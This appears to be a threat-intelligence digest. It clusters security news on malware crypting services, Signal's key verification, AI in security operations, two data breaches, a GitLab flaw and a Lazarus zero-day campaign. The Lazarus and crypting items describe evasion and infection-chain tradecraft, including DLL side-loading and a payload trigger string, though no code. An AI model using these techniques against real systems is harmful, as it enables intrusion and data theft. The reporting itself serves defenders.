- Published: 2026-08-13T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
```

#### Full body

```
Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Malware Crypting Services and the Threat Actors Who Sell Them
  - Published: 2026-08-13T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
  - Summary: Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.

### Cluster e3e17afe7c — score 10

- Title: How Trail of Bits helps verify the integrity of your Signal chats
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-08-11T17:30:00+00:00
- Link: https://blog.trailofbits.com/2026/08/11/how-trail-of-bits-helps-verify-the-integrity-of-your-signal-chats/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Every Signal chat starts the same way: the client asks the Signal server for the public key associated with your contact’s phone number. But how do you know the server gave you the right key? A compromised server could provide a false public key, allowing the client to encrypt messages to an attacker rather than the intended recipient. Until now, the only way to detect such malfeasance was to verify safety numbers with your contact in person or over a trusted channel. Signal recently launched an alternative: Automatic Key Verification , a feature that helps validate that your chats are secure without requiring direct safety number comparison . Trail of Bits built and operates one of the three auditors that make this system trustworthy. Our auditor, which is an independent implementation written from scratch, continuously checks that the Automatic Key Verification system behaves honestly. How key verification works Automatic Key Verification is a form of “key transparency” that makes mi
```

#### Full body

```
Page content Every Signal chat starts the same way: the client asks the Signal server for the public key associated with your contact’s phone number. But how do you know the server gave you the right key? A compromised server could provide a false public key, allowing the client to encrypt messages to an attacker rather than the intended recipient. Until now, the only way to detect such malfeasance was to verify safety numbers with your contact in person or over a trusted channel. Signal recently launched an alternative: Automatic Key Verification , a feature that helps validate that your chats are secure without requiring direct safety number comparison . Trail of Bits built and operates one of the three auditors that make this system trustworthy. Our auditor, which is an independent implementation written from scratch, continuously checks that the Automatic Key Verification system behaves honestly. How key verification works Automatic Key Verification is a form of “key transparency” that makes mismatch attacks harder to hide by creating a globally consistent view of the set of public keys associated with each phone number. The Signal app now performs a periodic self-check to ensure that all keys stored in the global map for your account belong to your devices. If the app is unable to verify the log, or finds that not all keys are expected, the user is presented with a warning that “Automatic Key Verification is currently unavailable for your device.” Automatic Key Verification may also be unavailable for other reasons, as outlined in Signal’s documentation . What our auditor does Automatic Key Verification depends on external auditors. Trail of Bits helps this system function by providing external verification that the user ↔ public key map is globally consistent and well formed, and does not hide any entries. Each time a new entry is added, we update our local copy of the map, stored as a Merkle tree. Periodically, we sign the head of the tree using a signing key that only we know. Because we commit to only ever signing one consistent lineage of Merkle trees, clients know that they are seeing the same set of public keys as everyone else in the system. Clients currently require signatures from each of three auditors: one operated by Signal, one operated by Cloudflare, and one operated by Trail of Bits. When Automatic Key Verification is turned on, the Signal client periodically fetches Merkle tree heads from the Signal key transparency server. The client requires that each tree head belong to a lineage endorsed by all registered auditors within the last seven days. If the server does not present valid auditor signatures, the client will raise a warning and Automatic Key Verification will fail. A fully malicious server may therefore maintain a split view of the system for at most one week before client applications start to display warning messages. We chose to implement our auditor from scratch, based on the specification , to provide independent verification; the code is open source . Signal also publishes a reference implementation . We will provide updates to this blog post if we need to make substantive changes to our signing policy, such as resetting the state of our auditor or rotating our signing key. Our current public key is: 7fe5d91de235188486d8fb836a6da37e625e2b10eb6d144185b9364cc83cbbb6 How to use Automatic Key Verification You can enable Automatic Key Verification in Signal by going to “Settings > Privacy > Advanced” and enabling Automatic Key Verification. In supported chats, you can verify the public key of your counterparty by visiting the safety number verification screen and clicking “Verify Automatically.” Automatic Key Verification often does not support chats where you started the conversation by searching for a recipient’s username. See Signal’s help page for more information. If automatic verification fails, users should fall back on safety number comparison. Why we’re doing this We believe that free a
```

#### Corroborating sources (1)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: How Trail of Bits helps verify the integrity of your Signal chats
  - Published: 2026-08-11T17:30:00+00:00
  - Link: https://blog.trailofbits.com/2026/08/11/how-trail-of-bits-helps-verify-the-integrity-of-your-signal-chats/
  - Summary: Every Signal chat starts the same way: the client asks the Signal server for the public key associated with your contact’s phone number. But how do you know the server gave you the right key? A compromised server could provide a false public key, allowing the client to encrypt messages to an attacker rather than the intended recipient. Until now, the only way to detect such malfeasance was to verify safety numbers with your contact in person or over a trusted channel. Signal recently launched an alternative: Automatic Key Verification , a feature that helps validate that your chats are secure without requiring direct safety number comparison . Trail of Bits built and operates one of the three auditors that make this system trustworthy. Our auditor, which is an independent implementation written from scratch, continuously checks that the Automatic Key Verification system behaves honestly. How key verification works Automatic Key Verification is a form of “key transparency” that makes mi

### Cluster 272e108269 — score 10

- Title: AI is Working in the SOC. So Why are Security Executives More Worried Than Ever?
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-12T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ai-report-500-security-leaders-reveal-security-operations-transformation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors
```

#### Full body

```
Back to Blog Artificial Intelligence AI is Working in the SOC. So Why are Security Executives More Worried Than Ever? Rapid7 Aug 12, 2026 | Last updated on Aug 12, 2026 | 3 min read DOWNLOAD THE REPORT Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors handle their organization's security data. This isn't a contradiction of the 97% positive sentiment, but rather a maturity signal. When AI was experimental, the question was: does it work? Operational teams answered that. Now that AI is embedded in production SOCs, a different question is arriving at the executive level: how do we govern it? Who is accountable when something is wrong? What happens when the model misses a critical threat, and whose job was it to catch that? These are board-level questions, and the research suggests that the organizations who don't have good answers are about to feel that gap acutely. The human-AI balance is the real differentiator 92% of respondents said AI enhances rather than replaces human analysts. But 41% are actively worried about over-reliance, or that teams could start deferring to AI in moments where an experienced analyst would have caught something the model missed. The best security teams aren't choosing between AI and human expertise. They're building operating models where AI handles the volume – triaging, pattern matching, initial investigations – while analysts lead the decisions that require context, creativity, and accountability. The question for any SOC leader isn't 'should we use AI?' It's 'where does AI create capacity without creating new blind spots?' MDR is being redefined 86% of respondents believe AI-enabled MDR has a clear advantage over traditional approaches. And when asked what they actually expect from an AI-enabled MDR provider, the top answer wasn't faster detection or higher automation rates. It was transparency. 55% said their top expectation is visibility into how AI decisions are being made. 53% want AI explicitly integrated with human analyst expertise. 52% want regular updates on model performance and accuracy. 'We use AI' is not a differentiator anymore. What buyers now want to know is: can you show me exactly how? What this means for your security strategy The Omdia research gives security leaders something most AI content doesn't: an independent benchmark for where the market actually is. Use it to pressure-test your AI governance posture, to reframe conversations with your board, and to evaluate whether your MDR provider can answer the transparency questions that 55% of buyers are now asking. The full report covers all of this in detail, including where organizations remain most cautious, what makes AI adoption succeed or stall, and what the next phase of AI-enabled security operations looks like. Download the full Omdia report . Article Tags Research Security Operations (SOC) Rapid7 Author Posts
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: AI is Working in the SOC. So Why are Security Executives More Worried Than Ever?
  - Published: 2026-08-12T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ai-report-500-security-leaders-reveal-security-operations-transformation
  - Summary: Something shifted in security operations over the last two years: AI stopped being a pilot program and became the plan. And if you survey 500 security professionals on whether that's going well – as Omdia did, commissioned by Rapid7 – you get a remarkable level of consensus: 97% report positive outcomes, 98% say AI reduces alert fatigue, and 95% say it's helping address staffing shortages. Those numbers are high enough that the story could stop there; AI is working, everyone agrees. Move on. But there's a more interesting finding sitting underneath that consensus, and it tells you something important about where security operations is actually headed. The confidence gap nobody is talking about While frontline SOC teams report strong confidence in AI, executive security leaders like CISOs, CSOs, and VPs are taking a considerably harder look. The research found that executive leaders are 1.6 times more likely than operational security managers to be highly concerned about how AI vendors

### Cluster 3480d0339c — score 10

- Title: Nearly 750k had financial info, SSNs leaked in South Carolina loan company breach
- Source: The Record (cyber_news_breach_reporting)
- Published: 2026-08-17T20:05:00+00:00
- Link: https://therecord.media/financial-info-leak-debt-consolidator
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: financial_services, government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: financial_services, government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The breach affected anyone who received a loan through the company or inquired about a loan product through a third party.
```

#### Full body

```
Image: Ave Calvar via Unsplash Nearly 750k had financial info, SSNs leaked in South Carolina loan company breach Cybercriminals breached the cloud system of a debt consolidation loan company in May, stealing troves of sensitive financial information and personal data on about 750,000 customers. The company, Heights Finance, published a warning to customers last week about the data breach and told regulators in Texas on Friday that 734,828 people were affected. Heights Finance operates dozens of personal loan companies across Alabama, Tennessee, Georgia, Texas and South Carolina. The stolen information includes contact information like addresses; banking data ranging from account numbers to routing numbers; and government IDs that include Social Security numbers, tax IDs, driver’s license numbers or state IDs. The breach also included any personal information shared during customer service interactions. Heights Finance said the breach was discovered on May 7 when a hacker gained access to a cloud-based platform hosted by a third party that they use to store some customer data. “This activity was limited to the cloud-based platform only — it did not affect any of our loan management systems or other computer systems or networks,” the company said. “We have since confirmed that the cloud-based platform is secure and that there is no ongoing security threat.” The breach affected anyone who received a loan through the company or inquired about a loan product through a third party. The breach includes some customers of parent company Curo Management and its related brands. No hacking group has taken credit for the incident and Heights Finance said it has hired a cybersecurity company to monitor the dark web for any information stolen in the incident. “Our specialist is actively scanning dark web forums, marketplaces, and other platforms. As of this writing, they have not found any evidence that information involved in this incident is on the dark web,” the Greenville, South Carolina-based company added. Heights Finance has more than 285 offices across 11 states. It was previously sued by the federal government for targeting borrowers “who are struggling to repay their existing loan and thus need to refinance to avoid prolonged delinquency and default.” “[Heights Finance] does this because they generate more revenue by harvesting fees from frequent, payment-stressed refinancers than from timely re-payers,” federal prosecutors said. The case was dismissed shortly after the Trump administration took office. Cybercrime News News Briefs Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles Jonathan Greig is a Breaking News Reporter at Recorded Future News. Jonathan has worked across the globe as a journalist since 2014. Before moving back to New York City, he worked for news outlets in South Africa, Jordan and Cambodia. He previously covered cybersecurity at ZDNet and TechRepublic.
```

#### Corroborating sources (1)

- **The Record** (cyber_news_breach_reporting)
  - Title: Nearly 750k had financial info, SSNs leaked in South Carolina loan company breach
  - Published: 2026-08-17T20:05:00+00:00
  - Link: https://therecord.media/financial-info-leak-debt-consolidator
  - Summary: The breach affected anyone who received a loan through the company or inquired about a loan product through a third party.

### Cluster b403b325bc — score 10

- Title: Pokémon Center data breach exposes customer info, cancels some orders
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T19:12:39+00:00
- Link: https://www.bleepingcomputer.com/news/security/pokemon-center-data-breach-exposes-customer-info-cancels-some-orders/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. [...]
```

#### Full body

```
Pokémon Center data breach exposes customer info, cancels some orders By Lawrence Abrams August 17, 2026 03:12 PM 0 Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. While CEVA's systems were compromised in the cyberattack, the exposed records belonged to Pokémon Center customers who submitted orders on the site. The company then shared this information with the logistics provider to fulfill and ship PokemonCenter.com orders. CEVA Logistics is a subsidiary of the CMA CGM Group, the world's third-largest shipping company. The logistics provider operates 1,000 warehouses, handled 15 million shipments last year, and reported $18.3 billion in revenue in 2025. The company recently suffered a cyberattack in which attackers breached its servers between July 29 and August 1, affecting multiple retailers in Europe . The CEVA breach also affected Valve , which notified Steam hardware customers in Europe that their names, addresses, phone numbers, email addresses, and information about ordered products were stolen during the cyberattack. The Valve breach notification said CEVA said it retains delivery-related information for up to 90 days after an order. However, it is unclear whether the same retention period applies to Pokémon Center customer data. The attack also disrupted eight of its European warehouses, causing shipping delays for many customers. Pokémon Center orders canceled after breach In data breach notification emails seen by BleepingComputer, Pokémon Center says CEVA is the vendor it uses to ship PokemonCenter.com products to customers in the United Kingdom and Germany. "We're sorry to inform you that we have had to cancel your recent order [order number] due to an unforeseen fulfilment issue," reads the Pokémon Center data breach notification. "We are writing to let you know about a cyber incident affecting a Pokémon Center logistics provider that may affect some of your information. CEVA Logistics ("CEVA"), the vendor Pokémon Center utilizes to ship product from PokemonCenter.com for customers in the United Kingdom and Germany, has informed us that unfortunately they were a victim of a cyber attack commencing on 30 July, 2026." Pokémon Center says unauthorized parties may have obtained customers' full names, mailing addresses, phone numbers, email addresses, and details about the contents of their PokemonCenter.com orders. The company says other information related to customers and their orders was not impacted and that CEVA does not have access to customers' payment card details. Pokémon Center is currently displaying a notice on its UK website warning that some orders are experiencing delays and may take longer than usual to process, dispatch, and deliver. Message to UK customers on the Pokémon Center website Source: BleepingComputer However, customers are also reporting that the breach caused their orders to be canceled, although it is unclear why the cyberattack would require cancellations rather than simply delays. While initial reports warned of cancellations for the highly anticipated 30th anniversary collection products, a Reddit post shows that other merchandise, such as the Ghost Chateau Cyndaquil keyring, was affected. Another customer replied that they had also received the same cancellation email. BleepingComputer contacted Pokémon Center and Pokémon media contacts to learn more about the breach and why the incident caused customer orders to be canceled, but has not received a reply. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Pokémon Center data breach exposes customer info, cancels some orders
  - Published: 2026-08-17T19:12:39+00:00
  - Link: https://www.bleepingcomputer.com/news/security/pokemon-center-data-breach-exposes-customer-info-cancels-some-orders/
  - Summary: Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. [...]

### Cluster 52bc515eda — score 10

- Title: Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T21:03:04+00:00
- Link: https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-19478, GitLab

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_industries: telecommunications
- affected_products: GitHub, GitLab, cPanel
- cve_ids: CVE-2026-19478, CVE-2026-19650
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_industries: telecommunications
- affected_products: GitLab, GitHub, cPanel
- cve_ids: CVE-2026-19478, CVE-2026-19650
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
GitLab has released security updates to address a critical vulnerability impacting its Community Edition (CE) and Enterprise Edition (EE) software that, under certain conditions, could allow an unauthenticated attacker to remotely modify or delete public projects and user data. The flaw, tracked as CVE-2026-19478, has been rated Critical by GitLab and assigned a CVSS score of 9.4. Released on
```

#### Full body

```
Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects  Swati Khandelwal  Aug 17, 2026 Vulnerability / DevOps GitLab has released security updates to address a critical vulnerability impacting its Community Edition (CE) and Enterprise Edition (EE) software that, under certain conditions, could allow an unauthenticated attacker to remotely modify or delete public projects and user data. The flaw, tracked as CVE-2026-19478 , has been rated Critical by GitLab and assigned a CVSS score of 9.4. Released on August 17, 2026, the critical patch release arrived outside the company's usual schedule of twice-monthly updates on the second and fourth Wednesdays, five days after a routine patch release that carried no critical-rated issues. Only self-managed installations need to act. The fixes are available in GitLab 19.2.4, 19.1.6, 19.0.8, and 18.11.11 . "GitLab.com and GitLab Dedicated are already running the patched version. GitLab.com and GitLab Dedicated customers do not need to take action," the company said. The following versions are affected - All versions from 18.2 before 18.11.11 19.0 before 19.0.8 19.1 before 19.1.6 19.2 before 19.2.4 The fixes do not extend to the 18.2 through 18.10 branches, which fall inside the affected range. "GitLab has remediated an issue that under certain conditions could allow an unauthenticated user to remotely modify or delete public projects and user data via a GraphQL directive," GitLab said . The CVSS vector published for the flaw indicates that it can be exploited over a network by an attacker holding no credentials, and without any action on the part of a victim. GitLab has not named the GraphQL directive involved or specified what the conditions necessary for exploitation are. The advisory discloses no exploitation of either flaw, and no public exploit code for them has surfaced on GitHub as of August 18, 2026. The second issue fixed in the release, CVE-2026-19650 , has been rated High by GitLab with a CVSS score of 7.1, and concerns a cross-site request forgery (CSRF) weakness in the GraphQL multiplex query handler. Unlike the critical flaw, it requires user interaction to work. "GitLab has remediated an issue that under certain conditions could have allowed an unauthenticated user to execute mutations via GET requests due to improper request validation in GraphQL multiplex query handling," the company said. The company said the update introduces no new migrations and is not expected to require downtime on multi-node deployments. The disclosure follows a July 2026 report in which researchers published working exploit code for a separate GitLab flaw affecting self-managed servers. GitLab did not immediately respond to a request for comment. The company said it makes the issues detailing each vulnerability public on its issue tracker 90 days after the release that patched them. GitLab's June 10, 2026 patch release put that window at 30 days. That places technical details of both flaws at around mid-November 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Application Security , CSRF , cybersecurity , DevOps Security , Gitlab , Patch Management , Software Security , Vulnerability , Web Security ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hund
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects
  - Published: 2026-08-17T21:03:04+00:00
  - Link: https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html
  - Summary: GitLab has released security updates to address a critical vulnerability impacting its Community Edition (CE) and Enterprise Edition (EE) software that, under certain conditions, could allow an unauthenticated attacker to remotely modify or delete public projects and user data. The flaw, tracked as CVE-2026-19478, has been rated Critical by GitLab and assigned a CVSS score of 9.4. Released on

### Cluster 22bf2708a0 — score 10

- Title: Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T17:39:27+00:00
- Link: https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Lazarus

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: Lazarus
- affected_industries: aviation_defense
- cve_ids: CVE-2026-68820
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor
- actor_attribution: Lazarus
- affected_industries: aviation_defense
- cve_ids: CVE-2026-68820
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and
```

#### Full body

```
Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Cyber Espionage The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job , a long-running cyber espionage and social engineering campaign orchestrated by Pyongyang-backed hackers to target professionals worldwide with fake-but-compelling job offers at firms like Lockheed Martin and Enveil to steal sensitive data and install malware by approaching them on platforms like LinkedIn, pretending to be recruiters in an attempt to build trust. The attacks have been found to exploit CVE-2026-68820 (CVSS score: 7.0), a privilege escalation flaw affecting Windows Ancillary Function Driver for WinSock ("AFD.sys") that was patched by Microsoft as part of its Patch Tuesday updates for August 2026. Check Point Research told The Hacker News that it reported the vulnerability to Microsoft in late July 2026, although it said "we are familiar with a successful implementation of the CVE in the beginning of June." As observed in prior campaign waves, victims are lured through bogus recruiter messages and tricked into opening a malicious PDF or installing a trojanized PDF viewer, which is then used to install a new backdoor called Troy that grants remote access to the compromised machine. The end goal of these intrusions is to seize complete control of infected computers and bypass security controls. The use of a trojanized PDF viewer is a tried-and-tested tactic adopted by the Lazarus Group in conjunction with Dream Job , with the threat actors abusing this method as far back as 2022. Two different parallel infection sequences have been detected as part of the latest attacks - DLL side-loading , in which victims are instructed to download an encrypted archive that's used to trigger a DLL side-loading chain. The malicious DLL ("libmupdf.dll") is used to display a bogus job description lure, while it stealthily downloads and executes in memory a lightweight downloader dubbed MISTPEN . The downloader communicates with threat actor-controlled infrastructure using Microsoft Graph API and OneDrive to retrieve and run reconnaissance and persistence modules and trigger the "AFD.sys" driver exploit, before deploying ForestTiger (aka ScoringMathTea), which provides remote access to the host. Trojanized "SecurityPDF" PDF viewer , in which victims are instructed to download SecurityPDF from a website impersonating Enveil. Once installed, it monitors for any PDF document opened through it for a special marker ("This document is encrypted with sumatrapdf reader!!!!!!!!!!!!"). If such a marker is present, the application decrypts and launches an embedded payload that's responsible for loading a backdoor called Troy directly into memory. The DLL implant supports 17 operator commands to facilitate file enumeration, upload and download, archive and exfiltration, interactive shell access, process termination, in-memory DLL injection, and configuration updates. High-level overview of the DLL sideloading infection chain. MISTPEN, for its part, loads at least four different modules - GetInfoPlugin ("Release_GetInfoPlugin_x64.dll"), to profile the host and exfiltrate the collected information as a single wide-character string PvPlugin ("Release_PvPlugin_x64.dll"), to collect host reconnaissance data and details about running processes OneScreenCapture ("OneScreenCapture64.dll"), to take screenshots of the current desktop, including all monitors, and transmit them as JPEG images LPE (local privilege escalation) loader , which gathers host information, generates new key material using the ML-KEM post-quantum key encapsulation algorithm, and uses the ne
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Lazarus Exploits Windows Zero-Day to Gain SYSTEM Access and Deploy Backdoor
  - Published: 2026-08-12T17:39:27+00:00
  - Link: https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html
  - Summary: The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity, per Check Point Research, is part of Operation Dream Job, a long-running cyber espionage and
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day
  - Published: 2026-08-12T13:35:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/
  - Summary: Lazarus malware used post-quantum key exchange to protect delivery of a Windows zero-day exploit

### Cluster 4535ef9ae8 — score 10

- Title: Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T09:01:54+00:00
- Link: https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2026-59310, VMware

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, web_shell_backdoor
- actor_attribution: UNC5174
- affected_industries: government
- affected_products: VMware
- cve_ids: CVE-2026-59309, CVE-2026-59310
- urgency_signals: critical_cvss
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: UNC5174
- affected_industries: government
- affected_products: VMware
- cve_ids: CVE-2026-59310, CVE-2026-59309
- urgency_signals: critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were
```

#### Full body

```
